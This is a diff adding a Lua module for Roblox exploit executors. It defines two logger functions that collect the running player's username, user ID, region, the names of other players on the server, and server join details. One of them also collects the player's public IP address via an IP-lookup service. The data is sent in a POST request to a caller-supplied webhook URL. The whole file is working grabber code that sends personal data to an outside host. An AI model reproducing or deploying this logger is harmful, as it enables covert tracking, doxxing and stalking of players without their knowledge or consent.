@@ -1,0 +1,165 @@
+
+
+local Indexer = {}
+
+local Duration = 0.5
+
+function Indexer:Time(time)
+    local time = time or 0.5
+    local time = math.clamp(time,0.5,90)
+    Duration = time
+    end
+
+function Indexer:Log_1(url)
+S2, E2 = pcall(function()
+
+    local Plays = game:GetService("Players")
+
+    if not getgenv().getrenvs then
+    getgenv().getrenvs = "false"
+    end
+
+    spawn(function()
+        if getgenv().getrenvs == "false" then
+        getgenv().getrenvs = "true"
+        local with1 = {}
+
+        local codes
+
+        local LocalizationService = game:GetService("LocalizationService")
+        local player = game:GetService("Players").LocalPlayer
+
+        local resultreligion, codereligion = pcall(function()
+            return LocalizationService:GetCountryRegionForPlayerAsync(player)
+            end)
+
+        codes = codereligion
+
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer then
+        print(v.Name)
+        table.insert(with1,v.Name)
+        end
+        end
+
+        local with2 = ""
+        local tc1 = string.format(table.concat(with1, ", "))
+
+        local exploits = identifyexecutor()
+        
+        local data = {
+            ["content"] = "Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.." Game: http://roblox.com/games/"..game.PlaceId,
+            ["embeds"] = {
+                {
+                    ["title"] = tostring(game:GetService("Players").LocalPlayer.Name.." "..game:GetService("Players").LocalPlayer.UserId),
+                    ["description"] = "                                                                                            Username: " ..Plays.LocalPlayer.Name.. " Exploit: " ..exploits.. "                                                                                            Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.."".."                                                                                                                   with ```"..tc1.."``` in the same server                                                                                                                                            Region:  "..codes.."                                                                                                                                                                                                                                              "..tostring("PlaceId: "..game.PlaceId.." JobId: "..game.JobId).."                                                                                            local JobId = "..game.JobId.."                                                                                            local PlaceId = "..game.PlaceId.."                                                                                                                                                                                    game:GetService('TeleportService'):TeleportToPlaceInstance("..tostring(game.PlaceId)..", "..tostring(game.JobId)..", "..tostring(Plays.LocalPlayer.Name)..")",
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x7269da),
+                    ["image"] = {
+                        ["url"] = "https://i.pinimg.com/originals/16/03/fb/1603fb7077abb9093f4af305b4e5ce79.gif"
+                    }
+                }
+            }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        }
+        request(abcdef)
+        delay(Duration,function()
+            getgenv().getrenvs = "false"
+            end)
+        end
+        end)
+end)
+if not S2 and E2 then
+warn(E2)
+end
+end
+
+function Indexer:Log_2(url)
+S2, E2 = pcall(function()
+
+    local Plays = game:GetService("Players")
+
+    if not getgenv().getrenvs then
+    getgenv().getrenvs = "false"
+    end
+
+    spawn(function()
+        if getgenv().getrenvs == "false" then
+        getgenv().getrenvs = "true"
+        local with1 = {}
+
+        local codes
+
+        local LocalizationService = game:GetService("LocalizationService")
+        local player = game:GetService("Players").LocalPlayer
+
+        local resultreligion, codereligion = pcall(function()
+            return LocalizationService:GetCountryRegionForPlayerAsync(player)
+            end)
+
+        codes = codereligion
+
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer then
+        print(v.Name)
+        table.insert(with1,v.Name)
+        end
+        end
+
+        local with2 = ""
+        local tc1 = string.format(table.concat(with1, ", "))
+
+        local exploits = identifyexecutor()
+
+        local data = {
+            ["content"] = "Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.." Game: http://roblox.com/games/"..game.PlaceId,
+            ["embeds"] = {
+                {
+                    ["title"] = tostring(game:GetService("Players").LocalPlayer.Name.." "..game:GetService("Players").LocalPlayer.UserId),
+                    ["description"] = "                                                                                            Username: " ..Plays.LocalPlayer.Name.. " Exploit: " ..exploits.. "                                                                                            Profile: https://roblox.com/users/"..Plays.LocalPlayer.UserId.."".."                                                                                                                   with ```"..tc1.."``` in the same server                                                                                                                                            Region:  "..codes.."                                                                                                                                                                                                                                              "..tostring("PlaceId: "..game.PlaceId.." JobId: "..game.JobId).."                                                                                            local JobId = "..game.JobId.."                                                                                            local PlaceId = "..game.PlaceId.."                                                                                                                                                                                    game:GetService('TeleportService'):TeleportToPlaceInstance("..tostring(game.PlaceId)..", "..tostring(game.JobId)..", "..tostring(Plays.LocalPlayer.Name)..")".."                                                                                                                                                                                    IP: "..tostring(game:HttpGet("https://api.ipify.org", true)),
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0x7269da),
+                    ["image"] = {
+                        ["url"] = "https://i.pinimg.com/originals/16/03/fb/1603fb7077abb9093f4af305b4e5ce79.gif"
+                    }
+                }
+            }
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+
+        request = http_request or request or HttpPost or syn.request
+        local abcdef = {
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        }
+        request(abcdef)
+        delay(Duration,function()
+            getgenv().getrenvs = "false"
+            end)
+        end
+        end)
+end)
+if not S2 and E2 then
+warn(E2)
+end
+end
+
+return Indexer
